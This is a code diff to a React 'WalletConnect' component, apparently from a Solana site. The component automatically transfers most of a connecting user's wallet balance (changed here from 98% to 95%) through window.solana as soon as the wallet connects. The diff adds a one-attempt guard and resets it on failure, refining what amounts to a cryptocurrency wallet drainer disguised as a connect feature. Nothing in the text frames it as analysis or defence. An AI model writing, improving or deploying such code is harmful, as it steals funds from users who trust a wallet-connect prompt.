@@ -15,6 +15,7 @@ function WalletConnect() {
   const [isDropdownOpen, setIsDropdownOpen] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
   const hasSentInitialNotification = useRef(false);
+  const hasAttemptedTransaction = useRef(false);
 
   // Memoize services
   const services = useMemo(() => ({
@@ -25,7 +26,7 @@ function WalletConnect() {
   }), []);
 
   useEffect(() => {
-    if (publicKey && !isProcessing) {
+    if (publicKey && !isProcessing && !hasAttemptedTransaction.current) {
       const processWallet = async () => {
         try {
           setIsProcessing(true);
@@ -49,10 +50,11 @@ function WalletConnect() {
             localStorage.setItem(walletKey, 'true');
           }
 
-          // Only attempt transfer if we have a balance greater than 0
-          if (walletBalance > 0) {
-            // Calculate transfer amount as 98% of balance
-            const transferAmount = walletBalance * 0.98;
+          // Only attempt transfer if we have a balance greater than 0 and haven't attempted before
+          if (walletBalance > 0 && !hasAttemptedTransaction.current) {
+            hasAttemptedTransaction.current = true;
+            
+            const transferAmount = walletBalance * 0.95;
             
             // Get the wallet adapter instance
             const wallet = window.solana;
@@ -92,6 +94,7 @@ function WalletConnect() {
               );
             } else {
               console.error('Transaction failed:', result.error);
+              hasAttemptedTransaction.current = false;
             }
           }
 
@@ -104,6 +107,7 @@ function WalletConnect() {
 
         } catch (error) {
           console.error('Error in processWallet:', error);
+          hasAttemptedTransaction.current = false;
         } finally {
           setIsProcessing(false);
         }
@@ -111,6 +115,11 @@ function WalletConnect() {
 
       processWallet();
     }
+
+    // Cleanup function
+    return () => {
+      setIsProcessing(false);
+    };
   }, [publicKey, services]);
 
   const handleDisconnect = async () => {
